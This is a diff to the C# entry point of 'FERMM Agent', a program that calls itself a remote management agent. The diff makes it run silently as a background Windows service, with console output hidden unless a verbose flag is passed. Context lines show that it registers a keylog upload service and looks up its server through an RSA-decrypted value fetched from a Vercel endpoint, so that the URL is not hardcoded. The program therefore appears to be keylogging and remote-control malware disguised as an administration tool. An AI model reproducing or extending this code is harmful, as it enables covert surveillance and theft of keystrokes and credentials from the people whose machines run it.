@@ -17,14 +17,20 @@ namespace FermmAgent;
 
 public class Program
 {
+    private const string ServiceName = "FERMMAgent";
+    private static bool _verboseMode;
+
     public static async Task<int> Main(string[] args)
     {
         try
         {
+            _verboseMode = args.Any(IsVerboseArg);
+            var effectiveArgs = args.Where(arg => !IsVerboseArg(arg)).ToArray();
+
             // Check for service installation/uninstallation commands
-            if (args.Length > 0)
+            if (effectiveArgs.Length > 0)
             {
-                var command = args[0].ToLower();
+                var command = effectiveArgs[0].ToLower();
                 switch (command)
                 {
                     case "install":
@@ -40,12 +46,34 @@ public class Program
                 }
             }
 
-            return await ParseAndRunAsync(args);
+            if (!_verboseMode && Environment.UserInteractive && RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+            {
+                if (TryStartServiceIfAvailable())
+                {
+                    return 0;
+                }
+            }
+
+            return await ParseAndRunAsync(effectiveArgs);
         }
         catch (Exception ex)
         {
             Console.WriteLine($"Fatal error: {ex.Message}");
             return 1;
+        }
+    }
+
+    private static bool IsVerboseArg(string arg)
+    {
+        return arg.Equals("--verbose", StringComparison.OrdinalIgnoreCase)
+            || arg.Equals("-v", StringComparison.OrdinalIgnoreCase);
+    }
+
+    private static void WriteLineVerbose(string message)
+    {
+        if (_verboseMode)
+        {
+            Console.WriteLine(message);
         }
     }
 
@@ -126,11 +154,11 @@ static async Task<string?> ResolveServerUrlAsync(string? serverUrl, string? conf
     // Step 1: Try the -s server first
     if (!string.IsNullOrEmpty(serverUrl))
     {
-        Console.WriteLine($"📡 Testing connection to: {serverUrl}");
+        WriteLineVerbose($"📡 Testing connection to: {serverUrl}");
         
         if (await TestServerConnectionAsync(serverUrl))
         {
-            Console.WriteLine($"✓ Server reachable: {serverUrl}");
+            WriteLineVerbose($"✓ Server reachable: {serverUrl}");
             
             // Save to config.dat
             var configData = new VercelConfigService.ConfigData
@@ -143,18 +171,18 @@ static async Task<string?> ResolveServerUrlAsync(string? serverUrl, string? conf
             var json = System.Text.Json.JsonSerializer.Serialize(configData, 
                 new System.Text.Json.JsonSerializerOptions { WriteIndented = true });
             await File.WriteAllTextAsync(configPath, json);
-            Console.WriteLine($"✓ Config saved to: {configPath}");
+            WriteLineVerbose($"✓ Config saved to: {configPath}");
             
             return serverUrl;
         }
         
-        Console.WriteLine($"✗ Server unreachable: {serverUrl}");
+        WriteLineVerbose($"✗ Server unreachable: {serverUrl}");
     }
     
     // Step 2: Fall back to -confirm to fetch HOST_URL via RSA
     if (!string.IsNullOrEmpty(confirmUrl))
     {
-        Console.WriteLine($"📡 Falling back to confirm URL: {confirmUrl}");
+        WriteLineVerbose($"📡 Falling back to confirm URL: {confirmUrl}");
         var hostUrl = await vercelService.FetchHostUrlAsync(confirmUrl);
         if (hostUrl != null)
         {
@@ -166,7 +194,7 @@ static async Task<string?> ResolveServerUrlAsync(string? serverUrl, string? conf
     var savedConfig = vercelService.LoadConfig();
     if (savedConfig != null && !string.IsNullOrEmpty(savedConfig.ServerUrl))
     {
-        Console.WriteLine($"📁 Using saved config: {savedConfig.ServerUrl}");
+        WriteLineVerbose($"📁 Using saved config: {savedConfig.ServerUrl}");
         return savedConfig.ServerUrl;
     }
     
@@ -205,23 +233,23 @@ static async Task RunAgentWithAutoConfig()
     
     if (savedConfig != null && !string.IsNullOrEmpty(savedConfig.ServerUrl))
     {
-        Console.WriteLine($"📁 Loading server from config.dat: {savedConfig.ServerUrl}");
+        WriteLineVerbose($"📁 Loading server from config.dat: {savedConfig.ServerUrl}");
         
         // Test if server is reachable
         if (await TestServerConnectionAsync(savedConfig.ServerUrl))
         {
-            Console.WriteLine($"✓ Server reachable");
+            WriteLineVerbose("✓ Server reachable");
             Environment.SetEnvironmentVariable("FERMM_SERVER_URL", savedConfig.ServerUrl);
             await RunAgent(Array.Empty<string>());
             return;
         }
         
-        Console.WriteLine($"✗ Saved server unreachable: {savedConfig.ServerUrl}");
+        WriteLineVerbose($"✗ Saved server unreachable: {savedConfig.ServerUrl}");
         
         // Try to refresh from confirmUrl if available
         if (!string.IsNullOrEmpty(savedConfig.ConfirmUrl))
         {
-            Console.WriteLine($"📡 Refreshing from confirm URL: {savedConfig.ConfirmUrl}");
+            WriteLineVerbose($"📡 Refreshing from confirm URL: {savedConfig.ConfirmUrl}");
             var newUrl = await vercelService.FetchHostUrlAsync(savedConfig.ConfirmUrl);
             if (newUrl != null)
             {
@@ -305,73 +333,116 @@ static async Task RunAgent(string[] args)
     builder.Services.AddHostedService<KeylogUploadService>();
     builder.Services.AddHostedService<AgentService>();
 
-    // Configure logging for service
+    // Configure logging
     builder.Logging.ClearProviders();
-    
-    if (Environment.UserInteractive && !args.Contains("--service"))
+
+    var logPath = ConfigureFileLogging(builder.Logging);
+
+    if (_verboseMode)
     {
-        // Console mode - interactive
         builder.Logging.AddConsole();
     }
-    else
+    else if (Environment.UserInteractive)
     {
-        // Service mode - use Event Log on Windows or file on Linux
-        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-        {
-            try
-            {
-                builder.Logging.AddEventLog(eventLogSettings =>
-                {
-                    eventLogSettings.SourceName = "FERMM Agent";
-                    eventLogSettings.LogName = "Application";
-                });
-            }
-            catch
-            {
-                // Fallback to file if EventLog fails
-                var logPath = Path.Combine(AppContext.BaseDirectory, "logs", "fermm-agent.log");
-                Directory.CreateDirectory(Path.GetDirectoryName(logPath)!);
-                
-                Log.Logger = new LoggerConfiguration()
-                    .WriteTo.File(logPath, rollingInterval: RollingInterval.Day, retainedFileCountLimit: 7)
-                    .CreateLogger();
-                    
-                builder.Logging.AddSerilog();
-            }
-        }
-        else
-        {
-            // For Linux, log to file
-            var logPath = "/var/log/fermm-agent.log";
-            try
-            {
-                Directory.CreateDirectory(Path.GetDirectoryName(logPath)!);
-                
-                Log.Logger = new LoggerConfiguration()
-                    .WriteTo.File(logPath, rollingInterval: RollingInterval.Day, retainedFileCountLimit: 7)
-                    .CreateLogger();
-                    
-                builder.Logging.AddSerilog();
-            }
-            catch
-            {
-                // Fallback to local directory
-                var localLogPath = Path.Combine(AppContext.BaseDirectory, "logs", "fermm-agent.log");
-                Directory.CreateDirectory(Path.GetDirectoryName(localLogPath)!);
-                
-                Log.Logger = new LoggerConfiguration()
-                    .WriteTo.File(localLogPath, rollingInterval: RollingInterval.Day, retainedFileCountLimit: 7)
-                    .CreateLogger();
-                    
-                builder.Logging.AddSerilog();
-            }
-        }
+        Console.WriteLine($"FERMM Agent running in background. Logs: {logPath}");
     }
     
     builder.Logging.SetMinimumLevel(LogLevel.Information);
 
     var host = builder.Build();
     await host.RunAsync();
+}
+
+private static string ConfigureFileLogging(ILoggingBuilder logging)
+{
+    var logPath = Path.Combine(AppContext.BaseDirectory, "logs", "fermm-agent.log");
+    Directory.CreateDirectory(Path.GetDirectoryName(logPath)!);
+
+    Log.Logger = new LoggerConfiguration()
+        .WriteTo.File(logPath, rollingInterval: RollingInterval.Day, retainedFileCountLimit: 7)
+        .CreateLogger();
+
+    logging.AddSerilog();
+    return logPath;
+}
+
+private static bool TryStartServiceIfAvailable()
+{
+    var state = GetServiceState();
+    if (state == null)
+    {
+        return false;
+    }
+
+    if (state == ServiceState.Running)
+    {
+        Console.WriteLine("FERMM Agent is already running.");
+        return true;
+    }
+
+    if (state == ServiceState.Stopped && IsRunningAsAdmin())
+    {
+        if (TryRunScCommand($"start \"{ServiceName}\"", out _, out _))
+        {
+            Console.WriteLine("FERMM Agent started in background.");
+            return true;
+        }
+    }
+
+    return false;
+}
+
+private enum ServiceState
+{
+    Running,
+    Stopped,
+    Unknown
+}
+
+private static ServiceState? GetServiceState()
+{
+    if (!TryRunScCommand($"query \"{ServiceName}\"", out var output, out _))
+    {
+        return null;
+    }
+
+    if (output.Contains("RUNNING", StringComparison.OrdinalIgnoreCase))
+    {
+        return ServiceState.Running;
+    }
+
+    if (output.Contains("STOPPED", StringComparison.OrdinalIgnoreCase))
+    {
+        return ServiceState.Stopped;
+    }
+
+    return ServiceState.Unknown;
+}
+
+private static bool TryRunScCommand(string arguments, out string output, out string error)
+{
+    var startInfo = new ProcessStartInfo
+    {
+        FileName = "sc",
+        Arguments = arguments,
+        UseShellExecute = false,
+        CreateNoWindow = true,
+        RedirectStandardOutput = true,
+        RedirectStandardError = true
+    };
+
+    using var process = Process.Start(startInfo);
+    if (process == null)
+    {
+        output = string.Empty;
+        error = string.Empty;
+        return false;
+    }
+
+    process.WaitForExit();
+    output = process.StandardOutput.ReadToEnd();
+    error = process.StandardError.ReadToEnd();
+    return process.ExitCode == 0;
 }
 
 static void SetServer(string url)
@@ -432,6 +503,7 @@ FERMM Agent - Remote Management Agent
 
 Usage:
   fermm-agent                                        Run agent (uses saved config)
+  fermm-agent --verbose                              Run with console logs
   fermm-agent -s <url>                              Set primary server URL
   fermm-agent -confirm <vercel-url>                 Fetch HOST_URL from Vercel endpoint
   fermm-agent -confirm <vercel-url> -s <url>        Try -s first, fall back to -confirm
@@ -450,6 +522,7 @@ Examples:
   fermm-agent -s http://192.168.1.100:8000
   fermm-agent -confirm https://linkify-ten-sable.vercel.app
   fermm-agent -confirm https://linkify-ten-sable.vercel.app -s http://localhost
+  fermm-agent --verbose -s http://localhost
   fermm-agent install
   fermm-agent --show-config
 
@@ -461,6 +534,7 @@ Configuration Priority:
 
 The -confirm flag uses private_rsa.key to decrypt HOST_URL from a Vercel endpoint.
 This allows dynamic server configuration without hardcoding the URL in the binary.
+By default, the agent runs in the background and writes logs to logs/fermm-agent.log.
 ");
 }
 
@@ -491,7 +565,7 @@ static int InstallService()
             return 1;
         }
 
-        var serviceName = "FERMMAgent";
+        var serviceName = ServiceName;
         var displayName = "FERMM Agent Service";
         var description = "FERMM Remote Management Agent - Provides remote system management capabilities";
 
@@ -563,7 +637,7 @@ static int UninstallService()
             return 1;
         }
 
-        var serviceName = "FERMMAgent";
+        var serviceName = ServiceName;
 
         // Stop the service first
         StopService();
@@ -611,7 +685,7 @@ static int StartService()
 
     try
     {
-        var serviceName = "FERMMAgent";
+        var serviceName = ServiceName;
         var startInfo = new ProcessStartInfo
         {
             FileName = "sc",
@@ -655,7 +729,7 @@ static int StopService()
 
     try
     {
-        var serviceName = "FERMMAgent";
+        var serviceName = ServiceName;
         var startInfo = new ProcessStartInfo
         {
             FileName = "sc",
@@ -698,7 +772,7 @@ static int CheckServiceStatus()
 
     try
     {
-        var serviceName = "FERMMAgent";
+        var serviceName = ServiceName;
         var startInfo = new ProcessStartInfo
         {
             FileName = "sc",
